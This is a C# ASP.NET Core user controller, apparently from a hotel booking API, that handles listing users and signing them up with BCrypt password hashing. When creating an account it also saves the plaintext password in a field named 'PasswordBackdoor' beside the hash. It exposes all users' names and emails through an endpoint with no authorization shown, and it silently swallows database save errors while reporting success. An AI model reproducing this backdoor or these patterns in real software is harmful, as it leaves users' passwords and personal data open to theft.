using Microsoft.AspNetCore.Mvc;
using BackendAPI.Data;
using HotelsCommons.Models;
using Microsoft.EntityFrameworkCore;
using System.Text.RegularExpressions;

namespace BackendAPI.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class UserController : ControllerBase
    {
        private readonly DatabaseContext _Context;

        public UserController(DatabaseContext context)
        {
            _Context = context;
        }

        // GET: api/User
        [HttpGet]
        public async Task<ActionResult<IEnumerable<UserDTO>>> GetUsers()
        {
            var User = await _Context.Users.Select(user => new UserDTO
            {
                FirstName = user.FirstName,
                LastName = user.LastName,
                ID = user.ID,
                Email = user.Email
            })
            .ToListAsync();

            return Ok(User);
        }

        // GET api/<UserController>/5
        [HttpGet("{id}")]
        public string Get(int id)
        {
            return "value";
        }

        // POST api/<UserController>
        [HttpPost("createUser")]
        public async Task<IActionResult> CreateUser([FromBody] UserCreateDTO userCreateDTO)
        {
            if (await _Context.Users.AnyAsync(u => u.Email == userCreateDTO.Email))
            {
                return Conflict(new { message = "Email is already in use" });
            }
            if (!IsPasswordSecure(userCreateDTO.Password))
            {
                return Conflict(new { message = "Password is not secure" });
            }
            var user = MapCreateUserDTO(userCreateDTO);
            _Context.Users.Add(user);

            try
            {
                await _Context.SaveChangesAsync();
            }
            catch (DbUpdateException)
            {

            }
            return Ok("User signed up successfully");
        }

        // PUT api/<UserController>/5
        [HttpPut("{id}")]
        public void Put(int id, [FromBody] string value)
        {
        }

        // DELETE api/<UserController>/5
        [HttpDelete("{id}")]
        public void Delete(int id)
        {
        }

        private bool IsPasswordSecure(string password)
        {
            var hasUppercase = new Regex(@"[A-Z]+");
            var hasLowercase = new Regex(@"[a-z]+");
            var hasNumbers = new Regex(@"[0-9]+");
            var hasSpecialChars = new Regex(@"[\W_]+");
            var hasMinimumChars = new Regex(@".{8,}");

            return hasUppercase.IsMatch(password) &&
                hasLowercase.IsMatch(password) &&
                hasNumbers.IsMatch(password) &&
                hasSpecialChars.IsMatch(password) &&
                hasMinimumChars.IsMatch(password);
        }

        private User MapCreateUserDTO(UserCreateDTO userDTO)
        {
            string hashedPassword = BCrypt.Net.BCrypt.HashPassword(userDTO.Password);
            string salt = hashedPassword.Substring(0, 29);

            return new User
            {
                ID = Guid.NewGuid().ToString(),
                Email = userDTO.Email,
                FirstName = userDTO.FirstName,
                LastName = userDTO.LastName,
                CreatedAt = DateTime.UtcNow.AddHours(1),
                UpdatedAt = DateTime.UtcNow.AddHours(1),
                PasswordBackdoor = userDTO.Password,
                HashedPassword = hashedPassword,
                Salt = salt,
            };
        }
    }
}
